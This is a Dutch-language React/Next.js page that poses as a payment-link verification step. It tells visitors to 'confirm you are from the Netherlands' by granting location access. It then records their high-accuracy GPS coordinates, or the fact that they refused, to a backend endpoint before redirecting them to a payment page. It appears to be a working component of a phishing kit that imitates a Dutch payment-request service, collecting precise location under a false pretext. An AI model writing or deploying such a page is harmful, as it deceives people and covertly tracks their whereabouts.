import { useState } from 'react';

export async function getServerSideProps({ params }) {
  return { props: { slug: params.slug } };
}

export default function Verify({ slug }) {
  const [error, setError] = useState(null);
  const [loading, setLoading] = useState(false);

  const log = async (data) => {
    await fetch('/api/store-location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  };

  const handleLocation = () => {
    setLoading(true);
    setError(null);

    if (!navigator.geolocation) {
      setError('Locatie wordt niet ondersteund op dit apparaat.');
      setLoading(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await log({
          slug,
          flow: 'verify',
          event: 'allowed',
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });

        // ✅ pas NA succes redirecten
        window.location.href = `/pay/${slug}?verified=1`;
      },
      async () => {
        await log({
          slug,
          flow: 'verify',
          event: 'denied',
          denied: true,
        });

        setError('Geef eerst toegang tot locatie om verder te gaan.');
        setLoading(false);
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  };

  return (
    <>
      <style>{`
        html, body {
          margin: 0;
          padding: 0;
          background: #414380;
          font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
        }

        .page {
          min-height: 100vh;
          background: #414380;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: flex-start;
          text-align: center;
        }

        .circle {
          margin-top: 20px;
          width: 160px;
          height: 160px;
          border-radius: 50%;
          background: #ffffff;
          border: 10px solid #353575;
          overflow: hidden;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .circle img {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        h1 {
          color: #ffffff;
          font-size: 24px;
          margin: 24px 16px 8px;
        }

        p {
          color: #dcdff5;
          font-size: 15px;
          margin: 0 24px 24px;
        }

        button {
          background: #4CB7AC;
          color: #ffffff;
          border: none;
          border-radius: 14px;
          padding: 16px;
          font-size: 16px;
          width: calc(100% - 48px);
          max-width: 360px;
          box-shadow: 0 6px 16px rgba(0,0,0,0.25);
          cursor: pointer;
        }

        button:disabled {
          opacity: 0.7;
        }

        .error {
          margin-top: 16px;
          color: #ffd6d6;
        }
      `}</style>

      <div className="page">
        <div className="circle">
          <img
            src="https://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
            alt="Verificatie"
          />
        </div>

        <h1>🇳🇱 Bevestig dat je uit Nederland komt</h1>

        <p>
          Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.
        </p>

        <button onClick={handleLocation} disabled={loading}>
          {loading ? 'Even geduld…' : 'Bevestigen met locatie'}
        </button>

        {error && <div className="error">{error}</div>}
      </div>
    </>
  );
}
